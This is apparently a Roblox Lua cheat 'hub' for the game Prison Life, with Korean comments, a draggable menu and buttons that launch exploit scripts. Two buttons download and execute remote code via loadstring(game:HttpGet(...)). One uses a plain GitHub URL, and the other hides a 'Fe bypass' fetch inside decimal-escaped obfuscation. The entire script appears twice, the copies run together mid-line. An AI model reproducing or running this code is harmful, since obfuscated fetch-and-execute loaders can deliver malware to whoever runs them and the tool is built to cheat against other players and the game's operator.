local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui 생성
local gui = Instance.new("ScreenGui")
gui.Name = "콘솔x프리즌라이프핵스크립트"  -- 허브 이름 변경
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- MainFrame (허브 UI 전체)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 250, 0, 180)
mainFrame.Position = UDim2.new(0.5, -125, 0.4, -90)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

-- 꼭짓점을 둥글게 만들기 위한 마스크 프레임 (위쪽만 둥글게 유지)
local maskedFrame = Instance.new("Frame")
maskedFrame.Size = UDim2.new(1, 0, 0.85, 0)  -- 아래쪽 직각 유지
maskedFrame.BackgroundTransparency = 1
maskedFrame.Parent = mainFrame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = maskedFrame

-- TitleBar (드래그 가능 영역, 색 더 진하게)
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)  -- 더 진한 색
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

-- TitleBar 꼭짓점 둥글게 만들기
local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 16)
titleCorner.Parent = titleBar

-- 허브 UI 내용 예제 (텍스트)
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, -30)
textLabel.Position = UDim2.new(0, 0, 0, 30)
textLabel.Text = "모바일 허브 UI"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Parent = mainFrame

-- 버튼 생성 함수
local function createButton(text, position)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.4, 0, 0, 30)  -- 크기 줄임
    button.Position = position
    button.Text = text
    button.TextColor3 = Color3.fromRGB(0, 0, 0)  -- 검정색 텍스트
    button.TextSize = 18  -- 🔹 텍스트 크기 증가
    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- 빨간 버튼
    button.Parent = mainFrame
    
    -- 버튼 둥글게 만들기
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 10)
    buttonCorner.Parent = button

    return button
end

-- 🔹 윗부분 버튼 (연한 부분 아래로 내리기, 겹치지 않도록 조정)
local topLeftButton = createButton("위 왼쪽", UDim2.new(0.05, 0, 0.2, 0))   
local topRightButton = createButton("위 오른쪽", UDim2.new(0.55, 0, 0.2, 0)) 

-- 🔹 아래 부분 버튼 (크기 줄이고 정렬)
local bottomLeftButton = createButton("아래 왼쪽", UDim2.new(0.05, 0, 0.75, 0))
local bottomRightButton = createButton("아래 오른쪽", UDim2.new(0.55, 0, 0.75, 0))

-- "프라어드민" 버튼 클릭 시 특정 스크립트 실행
local pradminButton = createButton("프라어드민", UDim2.new(0.35, 0, 0.45, 0)) -- 버튼 생성 위치 조정
pradminButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
end)

-- "프라존도우" 버튼 클릭 시 특정 스크립트 실행
local prazonButton = createButton("프라존도우", UDim2.new(0.35, 0, 0.55, 0)) -- 버튼 생성 위치 조정
prazonButton.MouseButton1Click:Connect(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
end)

-- 톱니 모양 버튼 생성 (왼쪽 고정)
local settingsButton = Instance.new("TextButton")
settingsButton.Size = UDim2.new(0, 50, 0, 50)
settingsButton.Position = UDim2.new(0, 10, 0.5, -25)
settingsButton.Text = "⚙️"
settingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
settingsButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
settingsButton.Parent = gui

-- 허브 보이기/숨기기
mainFrame.Visible = false
settingsButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

-- 🛠️ 드래그 기능 (화면 이동 문제 해결)
local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

-- 🔹 드래그 후 화면이 따라 움직이는 문제 수정
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        local newX = startPos.X.Offset + delta.X
        local newY = startPos.Y.Offset + delta.Y

        -- 허브만 이동 (화면 이동 방지)
        mainFrame.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
    end
end)local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui 생성
local gui = Instance.new("ScreenGui")
gui.Name = "콘솔x프리즌라이프핵스크립트"  -- 허브 이름 변경
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- MainFrame (허브 UI 전체)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 250, 0, 180)
mainFrame.Position = UDim2.new(0.5, -125, 0.4, -90)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

-- 꼭짓점을 둥글게 만들기 위한 마스크 프레임 (위쪽만 둥글게 유지)
local maskedFrame = Instance.new("Frame")
maskedFrame.Size = UDim2.new(1, 0, 0.85, 0)  -- 아래쪽 직각 유지
maskedFrame.BackgroundTransparency = 1
maskedFrame.Parent = mainFrame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = maskedFrame

-- TitleBar (드래그 가능 영역, 색 더 진하게)
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)  -- 더 진한 색
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

-- TitleBar 꼭짓점 둥글게 만들기
local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 16)
titleCorner.Parent = titleBar

-- 허브 UI 내용 예제 (텍스트)
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, -30)
textLabel.Position = UDim2.new(0, 0, 0, 30)
textLabel.Text = "모바일 허브 UI"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Parent = mainFrame

-- 버튼 생성 함수
local function createButton(text, position)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.4, 0, 0, 30)  -- 크기 줄임
    button.Position = position
    button.Text = text
    button.TextColor3 = Color3.fromRGB(0, 0, 0)  -- 검정색 텍스트
    button.TextSize = 18  -- 🔹 텍스트 크기 증가
    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- 빨간 버튼
    button.Parent = mainFrame
    
    -- 버튼 둥글게 만들기
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 10)
    buttonCorner.Parent = button

    return button
end

-- 🔹 윗부분 버튼 (연한 부분 아래로 내리기, 겹치지 않도록 조정)
local topLeftButton = createButton("위 왼쪽", UDim2.new(0.05, 0, 0.2, 0))   
local topRightButton = createButton("위 오른쪽", UDim2.new(0.55, 0, 0.2, 0)) 

-- 🔹 아래 부분 버튼 (크기 줄이고 정렬)
local bottomLeftButton = createButton("아래 왼쪽", UDim2.new(0.05, 0, 0.75, 0))
local bottomRightButton = createButton("아래 오른쪽", UDim2.new(0.55, 0, 0.75, 0))

-- "프라어드민" 버튼 클릭 시 특정 스크립트 실행
local pradminButton = createButton("프라어드민", UDim2.new(0.35, 0, 0.45, 0)) -- 버튼 생성 위치 조정
pradminButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
end)

-- "프라존도우" 버튼 클릭 시 특정 스크립트 실행
local prazonButton = createButton("프라존도우", UDim2.new(0.35, 0, 0.55, 0)) -- 버튼 생성 위치 조정
prazonButton.MouseButton1Click:Connect(function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
end)

-- 톱니 모양 버튼 생성 (왼쪽 고정)
local settingsButton = Instance.new("TextButton")
settingsButton.Size = UDim2.new(0, 50, 0, 50)
settingsButton.Position = UDim2.new(0, 10, 0.5, -25)
settingsButton.Text = "⚙️"
settingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
settingsButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
settingsButton.Parent = gui

-- 허브 보이기/숨기기
mainFrame.Visible = false
settingsButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

-- 🛠️ 드래그 기능 (화면 이동 문제 해결)
local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

-- 🔹 드래그 후 화면이 따라 움직이는 문제 수정
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        local newX = startPos.X.Offset + delta.X
        local newY = startPos.Y.Offset + delta.Y

        -- 허브만 이동 (화면 이동 방지)
        mainFrame.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
    end
end)
